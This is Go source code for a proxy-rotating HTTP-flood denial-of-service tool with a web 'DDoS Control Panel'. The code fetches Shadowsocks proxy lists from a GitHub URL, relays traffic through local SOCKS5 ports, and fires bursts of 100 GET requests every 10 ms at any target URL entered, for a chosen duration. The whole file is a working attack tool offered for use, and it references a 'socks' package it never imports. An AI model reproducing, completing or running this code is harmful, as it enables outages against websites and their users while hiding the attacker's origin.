package main

import (
    "context"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io"
    "log"
    "net"
    "net/http"
    "net/url"
    "os"
    "os/signal"
    "strconv"
    "strings"
    "sync"
    "sync/atomic"
    "time"

    "github.com/greysquirr3l/lashes"
    ss "github.com/shadowsocks/go-shadowsocks2/core"
)

// ========== CONFIGURATION ==========
const (
    proxyListURL    = "https://raw.githubusercontent.com/render12345api/svr/main/ss_working.txt"
    maxProxies      = 8
    reqsPerBurst    = 100
    burstInterval   = 10 * time.Millisecond
    refreshInterval = 15 * time.Minute
    maxErrorLog     = 20
    localSocksPort  = 1080
)

// Supported encryption methods
var supportedMethods = map[string]bool{
    "aes-128-cfb": true, "aes-192-cfb": true, "aes-256-cfb": true,
    "aes-128-ctr": true, "aes-192-ctr": true, "aes-256-ctr": true,
    "aes-128-gcm": true, "aes-192-gcm": true, "aes-256-gcm": true,
    "chacha20-ietf-poly1305": true, "rc4-md5": true,
    "chacha20": true, "salsa20": true,
}

// ========== DATA STRUCTURES ==========
type ProxyConfig struct {
    Method   string
    Password string
    Server   string
    Port     string
}

type AttackStats struct {
    Requests uint64 `json:"requests"`
    Errors   uint64 `json:"errors"`
}

type ErrorEntry struct {
    Time   time.Time `json:"time"`
    Target string    `json:"target"`
    Error  string    `json:"error"`
    Proxy  string    `json:"proxy"`
}

// ========== GLOBAL STATE ==========
var (
    rotator        *lashes.Rotator
    proxyConfigs   []ProxyConfig
    stats          AttackStats
    errorLog       []ErrorEntry
    errorLogMutex  sync.Mutex
    attackActive   bool
    attackCancel   context.CancelFunc
    statsTicker    *time.Ticker
    webClients     = make(map[chan<- AttackStats]bool)
    webClientsLock sync.Mutex
)

// ========== PROXY PARSING ==========
func decodeBase64Safe(s string) (string, error) {
    if l := len(s) % 4; l > 0 {
        s += strings.Repeat("=", 4-l)
    }
    s = strings.ReplaceAll(s, "-", "+")
    s = strings.ReplaceAll(s, "_", "/")
    b, err := base64.StdEncoding.DecodeString(s)
    if err != nil {
        return "", err
    }
    return string(b), nil
}

func parseSSLine(line string) *ProxyConfig {
    line = strings.TrimSpace(line)
    if !strings.HasPrefix(line, "ss://") {
        return nil
    }
    if idx := strings.Index(line, "#"); idx != -1 {
        line = line[:idx]
    }
    if decoded, err := url.QueryUnescape(line); err == nil {
        line = decoded
    }

    raw := line[5:]

    // Standard format: ss://base64(method:pass)@server:port
    if atIdx := strings.Index(raw, "@"); atIdx != -1 {
        encoded := raw[:atIdx]
        serverPort := raw[atIdx+1:]
        decoded, err := decodeBase64Safe(encoded)
        if err == nil {
            mp := strings.SplitN(decoded, ":", 2)
            if len(mp) == 2 {
                sp := strings.SplitN(serverPort, ":", 2)
                if len(sp) == 2 {
                    return &ProxyConfig{
                        Method:   mp[0],
                        Password: mp[1],
                        Server:   sp[0],
                        Port:     sp[1],
                    }
                }
            }
        }
    }

    // Base64 JSON config
    var b64 string
    if strings.ContainsAny(raw, "@:") {
        return nil
    }
    b64 = raw
    if qIdx := strings.Index(b64, "?"); qIdx != -1 {
        b64 = b64[:qIdx]
    }
    decoded, err := decodeBase64Safe(b64)
    if err != nil {
        return nil
    }
    var j struct {
        Server string `json:"server"`
        Add    string `json:"add"`
        Port   string `json:"port"`
        Method string `json:"method"`
        Pass   string `json:"password"`
    }
    if err := json.Unmarshal([]byte(decoded), &j); err != nil {
        return nil
    }
    server := j.Server
    if server == "" {
        server = j.Add
    }
    if server == "" || j.Port == "" || j.Method == "" || j.Pass == "" {
        return nil
    }
    return &ProxyConfig{
        Method:   j.Method,
        Password: j.Pass,
        Server:   server,
        Port:     j.Port,
    }
}

func fetchProxyConfigs() ([]ProxyConfig, error) {
    log.Println("Fetching proxy list...")
    resp, err := http.Get(proxyListURL)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    body, err := io.ReadAll(resp.Body)
    if err != nil {
        return nil, err
    }
    lines := strings.Split(string(body), "\n")
    var configs []ProxyConfig
    for _, line := range lines {
        cfg := parseSSLine(line)
        if cfg != nil && supportedMethods[cfg.Method] {
            configs = append(configs, *cfg)
            log.Printf("✅ Valid: %s@%s:%s", cfg.Method, cfg.Server, cfg.Port)
        }
    }
    log.Printf("Total valid configs: %d", len(configs))
    return configs, nil
}

// ========== SHADOWSOCKS LOCAL SERVERS ==========
func startLocalSOCKS5(cfg ProxyConfig, localPort int) (func(), error) {
    cipher, err := ss.PickCipher(cfg.Method, nil, cfg.Password)
    if err != nil {
        return nil, fmt.Errorf("cipher error: %w", err)
    }

    remoteAddr := net.JoinHostPort(cfg.Server, cfg.Port)

    ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", localPort))
    if err != nil {
        return nil, err
    }

    go func() {
        for {
            conn, err := ln.Accept()
            if err != nil {
                return
            }
            go handleSOCKS5(conn, remoteAddr, cipher)
        }
    }()

    log.Printf("✅ Local SOCKS5 on 127.0.0.1:%d → %s (%s)", localPort, remoteAddr, cfg.Method)
    return func() { ln.Close() }, nil
}

func handleSOCKS5(client net.Conn, remoteAddr string, cipher ss.Cipher) {
    defer client.Close()
    // SOCKS5 handshake
    target, err := socks.Handshake(client)
    if err != nil {
        return
    }
    // Connect to remote Shadowsocks server
    remote, err := ss.Dial(remoteAddr, cipher)
    if err != nil {
        return
    }
    defer remote.Close()
    go func() {
        io.Copy(remote, client)
        if tcpConn, ok := remote.(*net.TCPConn); ok {
            tcpConn.CloseWrite()
        }
    }()
    io.Copy(client, remote)
    if tcpConn, ok := client.(*net.TCPConn); ok {
        tcpConn.CloseWrite()
    }
}

// ========== PROXY ROTATOR SETUP ==========
func setupRotator(ctx context.Context, configs []ProxyConfig) (*lashes.Rotator, error) {
    var proxyURLs []string
    var closers []func()

    for i, cfg := range configs {
        if i >= maxProxies {
            break
        }
        port := localSocksPort + i
        closer, err := startLocalSOCKS5(cfg, port)
        if err != nil {
            log.Printf("Failed to start proxy on port %d: %v", port, err)
            continue
        }
        closers = append(closers, closer)
        proxyURLs = append(proxyURLs, fmt.Sprintf("socks5://127.0.0.1:%d", port))
    }

    if len(proxyURLs) == 0 {
        return nil, fmt.Errorf("no proxies could be started")
    }

    go func() {
        <-ctx.Done()
        for _, closer := range closers {
            closer()
        }
    }()

    // Create rotator with default config
    config := lashes.DefaultConfig()
    config.Strategy = lashes.RoundRobin
    config.HealthCheck = &lashes.HealthCheckConfig{
        Interval: 30 * time.Second,
        Timeout:  5 * time.Second,
        Parallel: 3,
    }

    rot, err := lashes.NewRotator(config)
    if err != nil {
        return nil, err
    }

    // Add proxies
    for _, p := range proxyURLs {
        if err := rot.AddProxy(ctx, p, lashes.SOCKS5); err != nil {
            log.Printf("Failed to add proxy %s: %v", p, err)
        }
    }

    // Start health checks
    rot.StartHealthChecks(ctx)

    return rot, nil
}

// ========== ATTACK ENGINE ==========
func startAttack(target string, duration int) error {
    if attackActive {
        return fmt.Errorf("attack already in progress")
    }

    ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
    attackCancel = cancel
    attackActive = true
    atomic.StoreUint64(&stats.Requests, 0)
    atomic.StoreUint64(&stats.Errors, 0)
    errorLog = errorLog[:0]

    go func() {
        defer func() {
            attackActive = false
            broadcastStats()
        }()

        ticker := time.NewTicker(burstInterval)
        defer ticker.Stop()

        for {
            select {
            case <-ctx.Done():
                return
            case <-ticker.C:
                var wg sync.WaitGroup
                for i := 0; i < reqsPerBurst; i++ {
                    wg.Add(1)
                    go func() {
                        defer wg.Done()
                        if !attackActive {
                            return
                        }
                        proxy, err := rotator.Next(ctx)
                        if err != nil {
                            atomic.AddUint64(&stats.Errors, 1)
                            logError(target, err.Error(), "rotator")
                            return
                        }
                        client := &http.Client{
                            Transport: &http.Transport{
                                Proxy: http.ProxyURL(proxy.URL()),
                            },
                            Timeout: 10 * time.Second,
                        }
                        req, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
                        resp, err := client.Do(req)
                        if err != nil {
                            atomic.AddUint64(&stats.Errors, 1)
                            logError(target, err.Error(), proxy.URL().String())
                            return
                        }
                        io.Copy(io.Discard, resp.Body)
                        resp.Body.Close()
                        atomic.AddUint64(&stats.Requests, 1)
                    }()
                }
                wg.Wait()
            }
        }
    }()

    statsTicker = time.NewTicker(1 * time.Second)
    go func() {
        for range statsTicker.C {
            broadcastStats()
        }
    }()

    return nil
}

func stopAttack() {
    if attackCancel != nil {
        attackCancel()
    }
    if statsTicker != nil {
        statsTicker.Stop()
    }
    attackActive = false
    broadcastStats()
}

func logError(target, errMsg, proxy string) {
    entry := ErrorEntry{
        Time:   time.Now(),
        Target: target,
        Error:  errMsg,
        Proxy:  proxy,
    }
    errorLogMutex.Lock()
    defer errorLogMutex.Unlock()
    errorLog = append([]ErrorEntry{entry}, errorLog...)
    if len(errorLog) > maxErrorLog {
        errorLog = errorLog[:maxErrorLog]
    }
}

func broadcastStats() {
    currentStats := AttackStats{
        Requests: atomic.LoadUint64(&stats.Requests),
        Errors:   atomic.LoadUint64(&stats.Errors),
    }
    webClientsLock.Lock()
    defer webClientsLock.Unlock()
    for ch := range webClients {
        select {
        case ch <- currentStats:
        default:
        }
    }
}

// ========== WEB INTERFACE ==========
func main() {
    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()

    sigChan := make(chan os.Signal, 1)
    signal.Notify(sigChan, os.Interrupt)
    go func() {
        <-sigChan
        cancel()
        os.Exit(0)
    }()

    var err error
    proxyConfigs, err = fetchProxyConfigs()
    if err != nil {
        log.Fatal("Failed to fetch proxies:", err)
    }

    rotator, err = setupRotator(ctx, proxyConfigs)
    if err != nil {
        log.Fatal("Failed to setup rotator:", err)
    }

    go func() {
        ticker := time.NewTicker(refreshInterval)
        defer ticker.Stop()
        for {
            select {
            case <-ctx.Done():
                return
            case <-ticker.C:
                log.Println("Refreshing proxy list...")
                newConfigs, err := fetchProxyConfigs()
                if err != nil {
                    log.Println("Refresh failed:", err)
                    continue
                }
                proxyConfigs = newConfigs
            }
        }
    }()

    http.HandleFunc("/", indexHandler)
    http.HandleFunc("/start", startHandler)
    http.HandleFunc("/stop", stopHandler)
    http.HandleFunc("/stats", statsHandler)

    port := os.Getenv("PORT")
    if port == "" {
        port = "5000"
    }
    log.Printf("Server starting on :%s", port)
    log.Fatal(http.ListenAndServe(":"+port, nil))
}

func indexHandler(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    fmt.Fprint(w, htmlTemplate)
}

func startHandler(w http.ResponseWriter, r *http.Request) {
    if r.Method != http.MethodPost {
        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
        return
    }
    target := r.FormValue("target")
    durationStr := r.FormValue("duration")
    duration, err := strconv.Atoi(durationStr)
    if err != nil || duration <= 0 {
        http.Error(w, "Invalid duration", http.StatusBadRequest)
        return
    }
    if err := startAttack(target, duration); err != nil {
        http.Error(w, err.Error(), http.StatusInternalServerError)
        return
    }
    w.WriteHeader(http.StatusOK)
}

func stopHandler(w http.ResponseWriter, r *http.Request) {
    if r.Method != http.MethodPost {
        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
        return
    }
    stopAttack()
    w.WriteHeader(http.StatusOK)
}

func statsHandler(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")
    flusher, ok := w.(http.Flusher)
    if !ok {
        http.Error(w, "Streaming unsupported", http.StatusInternalServerError)
        return
    }
    w.Header().Set("Cache-Control", "no-cache")
    w.Header().Set("Connection", "keep-alive")

    clientChan := make(chan AttackStats, 1)
    webClientsLock.Lock()
    webClients[clientChan] = true
    webClientsLock.Unlock()

    defer func() {
        webClientsLock.Lock()
        delete(webClients, clientChan)
        webClientsLock.Unlock()
        close(clientChan)
    }()

    initialStats := AttackStats{
        Requests: atomic.LoadUint64(&stats.Requests),
        Errors:   atomic.LoadUint64(&stats.Errors),
    }
    if err := json.NewEncoder(w).Encode(initialStats); err != nil {
        return
    }
    flusher.Flush()

    for {
        select {
        case <-r.Context().Done():
            return
        case newStats := <-clientChan:
            if err := json.NewEncoder(w).Encode(newStats); err != nil {
                return
            }
            flusher.Flush()
        }
    }
}

const htmlTemplate = `<!DOCTYPE html>
<html>
<head>
    <title>DDoS Control Panel (Go)</title>
    <style>
        body { background: white; font-family: Arial, sans-serif; margin: 20px; color: #333; }
        .container { max-width: 1200px; margin: auto; }
        h1 { text-align: center; color: #222; margin-bottom: 30px; }
        .card { border: 1px solid #ccc; padding: 20px; border-radius: 8px; margin-bottom: 20px; background: #f9f9f9; }
        label { display: block; margin: 10px 0 5px; font-weight: bold; }
        input { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        .button-group { display: flex; gap: 10px; margin: 15px 0; }
        button { flex: 1; padding: 12px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        #startBtn { background: #28a745; color: white; }
        #startBtn:hover { background: #218838; }
        #stopBtn { background: #dc3545; color: white; }
        #stopBtn:hover { background: #c82333; }
        .status { padding: 15px; background: #e9ecef; border-radius: 4px; margin: 15px 0; font-size: 18px; text-align: center; }
        .stats { display: flex; justify-content: space-around; margin: 20px 0; }
        .stat-box { text-align: center; background: white; padding: 10px; border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 30%; }
        .stat-value { font-size: 32px; font-weight: bold; color: #007bff; }
        .stat-label { font-size: 14px; color: #666; }
        .footer { text-align: center; font-size: 12px; color: #999; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>DDoS Control Panel (Go)</h1>

        <div class="card">
            <div class="status" id="status">Online</div>

            <div class="stats">
                <div class="stat-box">
                    <div class="stat-value" id="reqCount">0</div>
                    <div class="stat-label">Requests</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="errCount">0</div>
                    <div class="stat-label">Errors</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="proxyCount">0</div>
                    <div class="stat-label">Proxies</div>
                </div>
            </div>

            <label for="target">Target URL (http:// or https://)</label>
            <input type="url" id="target" placeholder="https://example.com" required>

            <label for="duration">Duration (seconds)</label>
            <input type="number" id="duration" value="60" min="1" max="3600">

            <div class="button-group">
                <button id="startBtn">START ATTACK</button>
                <button id="stopBtn">STOP ATTACK</button>
            </div>

            <div class="footer">
                Using Go with lashes rotation engine – proxies refreshed every 15 min
            </div>
        </div>
    </div>

    <script>
        let statusInterval;

        async function updateStatus() {
            try {
                const res = await fetch('/stats');
                const data = await res.json();
                document.getElementById('reqCount').innerText = data.requests;
                document.getElementById('errCount').innerText = data.errors;
                document.getElementById('proxyCount').innerText = '8';
            } catch (err) {
                console.error('Stats error:', err);
            }
        }

        async function startAttack() {
            const target = document.getElementById('target').value;
            const duration = parseInt(document.getElementById('duration').value);
            if (!target) return alert('Please enter a target URL');

            const formData = new FormData();
            formData.append('target', target);
            formData.append('duration', duration);

            try {
                const res = await fetch('/start', {
                    method: 'POST',
                    body: formData
                });
                if (!res.ok) {
                    const text = await res.text();
                    alert('Error: ' + text);
                } else {
                    document.getElementById('status').innerText = 'Attacking';
                }
            } catch (err) {
                alert('Network error: ' + err.message);
            }
        }

        async function stopAttack() {
            try {
                const res = await fetch('/stop', { method: 'POST' });
                if (res.ok) {
                    document.getElementById('status').innerText = 'Online';
                }
            } catch (err) {
                alert('Network error: ' + err.message);
            }
        }

        document.getElementById('startBtn').addEventListener('click', startAttack);
        document.getElementById('stopBtn').addEventListener('click', stopAttack);
        setInterval(updateStatus, 1000);
        updateStatus();
    </script>
</body>
</html>`
